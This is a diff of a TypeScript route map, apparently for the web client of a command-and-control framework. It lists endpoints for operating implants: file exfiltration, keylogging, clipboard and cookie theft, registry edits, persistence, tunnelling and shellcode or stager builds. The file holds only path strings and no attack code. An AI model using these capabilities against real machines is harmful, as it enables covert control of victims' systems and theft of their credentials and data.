@@ -10,7 +10,6 @@ export const paths = {
   agents: {
     /** JSON list — dedicated REST under /api */
     list: (query = "") => (query ? `/api/agents?${query}` : "/api/agents"),
-    unlinked: "/api/agents/unlinked",
     /** Batch ops (auth group, not under /api/agents) */
     batch: "/agents/batch",
     bulkTask: "/agents/bulk/task",
@@ -22,7 +21,6 @@ export const paths = {
     tasks: (id: string) => `/agents/${id}/tasks`,
     task: (id: string, taskId: string | number) => `/agents/${id}/tasks/${taskId}`,
     inject: (id: string) => `/agents/${id}/inject`,
-    injectMethods: (id: string) => `/agents/${id}/inject/methods`,
     timeline: (id: string, query = "") => `/api/agents/${id}/timeline${query ? `?${query}` : ""}`,
     cancelTask: (id: string, taskId: string | number) => `/agents/${id}/tasks/${taskId}/cancel`,
     rerunTask: (id: string, taskId: string | number) => `/agents/${id}/task/${taskId}/rerun`,
@@ -36,7 +34,6 @@ export const paths = {
     command: (id: string) => `/agents/${id}/command`,
     screenshots: (id: string, query = "") =>
       query ? `/api/agents/${id}/screenshots?${query}` : `/api/agents/${id}/screenshots`,
-    processes: (id: string) => `/api/agents/${id}/processes`,
     processTree: (id: string) => `/api/agents/${id}/process-tree`,
     /** GET current frame (json). Pass "" for no query string. */
     screenshot: (id: string, query: string | null = "format=json") =>
@@ -55,15 +52,25 @@ export const paths = {
     filesLs: (id: string) => `/agents/${id}/files/ls`,
     filesRead: (id: string) => `/agents/${id}/files/read`,
     filesDelete: (id: string) => `/agents/${id}/files/delete`,
+    filesMkdir: (id: string) => `/agents/${id}/files/mkdir`,
+    filesRename: (id: string) => `/agents/${id}/files/rename`,
     /** Queue implant→server exfil (path only — do not attach a file). */
     filesExfil: (id: string) => `/agents/${id}/files/pull`,
     filesExfilGet: (id: string, filename: string) =>
       `/agents/${id}/files/exfil/${encodeURIComponent(filename)}`,
     /** Push a teamserver file onto the implant. */
     filesPush: (id: string) => `/agents/${id}/files/push`,
-    /** Agent fetches a URL onto its own disk. */
-    download: (id: string) => `/agents/${id}/download`,
     drives: (id: string) => `/agents/${id}/drives`,
+    services: (id: string) => `/agents/${id}/services`,
+    portscan: (id: string) => `/agents/${id}/portscan`,
+    netstat: (id: string) => `/agents/${id}/netstat`,
+    users: (id: string) => `/agents/${id}/users`,
+    av: (id: string) => `/agents/${id}/av`,
+    keyloggerStart: (id: string) => `/agents/${id}/keylogger/start`,
+    keyloggerStop: (id: string) => `/agents/${id}/keylogger/stop`,
+    keyloggerDump: (id: string) => `/agents/${id}/keylogger/dump`,
+    clipboardGet: (id: string) => `/agents/${id}/clipboard/get`,
+    clipboardSet: (id: string) => `/agents/${id}/clipboard/set`,
     find: (id: string) => `/agents/${id}/find`,
     config: (id: string) => `/agents/${id}/config`,
     persistence: (id: string) => `/agents/${id}/persistence`,
@@ -80,24 +87,26 @@ export const paths = {
     socksRelayStart: (id: string) => `/agents/${id}/socks_relay/start`,
     socksRelayStop: (id: string) => `/agents/${id}/socks_relay/stop`,
     socksRelayStatus: (id: string) => `/agents/${id}/socks_relay/status`,
-    cookieExport: (id: string) => `/agents/${id}/cookie_export`,
     cookieProxyStart: (id: string) => `/agents/${id}/cookie_proxy/start`,
     cookieProxyStop: (id: string) => `/agents/${id}/cookie_proxy/stop`,
     cookieProxy: (id: string) => `/agents/${id}/cookie_proxy`,
     cookieProxyJar: (id: string) => `/agents/${id}/cookie_proxy/jar`,
     cookieProxyNetscape: (id: string) => `/agents/${id}/cookie_proxy/netscape`,
     sccmRecon: (id: string) => `/agents/${id}/sccm_recon`,
-    entraPrt: (id: string) => `/agents/${id}/entra_prt`,
     fileHunt: (id: string) => `/agents/${id}/file_hunt`,
     screenTriggerStart: (id: string) => `/agents/${id}/screen_trigger/start`,
     screenTriggerStop: (id: string) => `/agents/${id}/screen_trigger/stop`,
     usbEnum: (id: string) => `/agents/${id}/usb_enum`,
-    usbDrop: (id: string) => `/agents/${id}/usb_drop`,
-    browserHistory: (id: string) => `/agents/${id}/browser_history`,
     sessionRecon: (id: string) => `/agents/${id}/session_recon`,
+    containerDetect: (id: string) => `/agents/${id}/container_detect`,
+    containerDocker: (id: string) => `/agents/${id}/container_docker`,
+    containerK8s: (id: string) => `/agents/${id}/container_k8s`,
+    browserHistory: (id: string) => `/agents/${id}/browser_history`,
+    regGet: (id: string) => `/agents/${id}/reg/get`,
+    regSet: (id: string) => `/agents/${id}/reg/set`,
+    regDelete: (id: string) => `/agents/${id}/reg/delete`,
     tunStart: (id: string) => `/agents/${id}/tun/start`,
     tunStop: (id: string) => `/agents/${id}/tun/stop`,
-    tun: (id: string) => `/agents/${id}/tun`,
     chain: (id: string) => `/agents/${id}/chain`,
     chainSet: (id: string) => `/agents/${id}/chain/set`,
     chainClear: (id: string) => `/agents/${id}/chain/clear`,
@@ -231,25 +240,28 @@ export const paths = {
     profiles: "/api/generate/profiles",
     profileSave: "/api/generate/profile",
     profileImport: "/api/generate/profile/import",
+    profileImportText: "/api/generate/profile/import-text",
+    profileValidate: "/api/generate/profile/validate",
     profileDelete: (name: string) => `/api/generate/profile/${encodeURIComponent(name)}`,
     buildStatus: (id: string | number) => `/generate/builds/${id}`,
     buildDownload: (id: string | number) => `/generate/builds/${id}/download`,
     delivery: "/generate/delivery",
     oneLiner: "/generate/one-liner",
+    /** Binary/stager/shellcode builds: /generate/exe, /dll, /ps1, /linux ... */
+    binary: (format: string) => `/generate/${format.startsWith("/") ? format.slice(1) : format}`,
+    donut: "/generate/donut",
   },
   macros: {
     list: "/api/macros",
     one: (id: string | number) => `/api/macros/${id}`,
     run: (id: string | number) => `/api/macros/${id}/run`,
     runs: (limit = 50) => `/api/macro-runs?limit=${limit}`,
-    runOne: (id: string | number) => `/api/macro-runs/${id}`,
     stopRun: (id: string | number) => `/api/macro-runs/${id}/stop`,
   },
   identity: {
     deviceCode: "/api/identity/device-code",
     deviceCodePoll: (id: string) => `/api/identity/device-code/${id}/poll`,
     consent: "/api/identity/consent",
-    consentStatus: (id: string) => `/api/identity/consent/${id}`,
     consentExchange: (id: string) => `/api/identity/consent/${id}/exchange`,
   },
   automation: {
@@ -286,7 +298,6 @@ export const paths = {
     oneshotList: "/api/scheduler/oneshot",
     oneshot: (id: string | number) => `/api/scheduler/oneshot/${id}`,
   },
-  listenersHealth: "/api/listeners/health",
   ai: {
     root: "/ai",
     config: "/ai/config",
@@ -295,7 +306,6 @@ export const paths = {
     sessionMessages: (id: string | number) => `/ai/sessions/${id}/messages`,
 		sessionBranch: (id: string | number) => `/ai/sessions/${id}/branch`,
 		runs: "/api/ai/runs",
-		run: (id: string) => `/api/ai/runs/${id}`,
 		runEvents: (id: string) => `/api/ai/runs/${id}/events`,
 		runCancel: (id: string) => `/api/ai/runs/${id}/cancel`,
 		profiles: "/api/ai/profiles",
@@ -303,7 +313,6 @@ export const paths = {
 		intentApprove: (id: string) => `/api/ai/intents/${id}/approve`,
 		intentReject: (id: string) => `/api/ai/intents/${id}/reject`,
 		knowledgeCollections: "/api/ai/knowledge/collections",
-		knowledgeSearch: "/api/ai/knowledge/search",
 		attachments: (sessionId: string | number) => `/api/ai/sessions/${sessionId}/attachments`,
 		attachment: (id: string) => `/api/ai/attachments/${id}`,
     pendingTasks: "/api/ai/pending-tasks",
@@ -331,10 +340,6 @@ export const paths = {
     collect: "/bloodhound/collect",
     one: (id: string | number) => `/bloodhound/${id}`,
     download: (id: string | number) => `/bloodhound/${id}/download`,
-  },
-  chrome: {
-    agents: "/api/chrome/agents",
-    agentTasks: (agentId: string) => `/chrome/agents/${agentId}/tasks`,
   },
   chat: {
     channels: "/chat/channels",
@@ -423,7 +428,6 @@ export const paths = {
     heatmap: (range = "30d") => `/api/mitre/heatmap?range=${range}`,
   },
   v1: {
-    tasks: "/api/v1/tasks",
     taskTypes: "/api/v1/task-types",
   },
   dns: {
@@ -432,7 +436,6 @@ export const paths = {
     stop: "/api/dns/stop",
   },
   timeline: {
-    export: "/api/timeline/export",
     data: (query = "") => (query ? `/api/timeline/data?${query}` : "/api/timeline/data"),
   },
   topology: {
@@ -486,10 +489,7 @@ export const paths = {
     execute: "/api/scripts/execute",
     one: (id: string) => `/api/scripts/${id}`,
   },
-  templates: {
-    list: "/api/templates",
-    one: (id: string) => `/api/templates/${id}`,
-  },
+
   roles: {
     list: "/api/roles",
     one: (id: string | number) => `/api/roles/${id}`,
@@ -503,7 +503,10 @@ export const paths = {
     action: (agentId: string) => `/toolkit/agents/${agentId}/action`,
   },
   traffic: {
-    page: "/traffic",
+    api: "/api/traffic",
+  },
+  chain: {
+    graph: "/chain/graph",
   },
   tasksCollab: {
     approve: (id: string | number) => `/tasks/${id}/approve`,
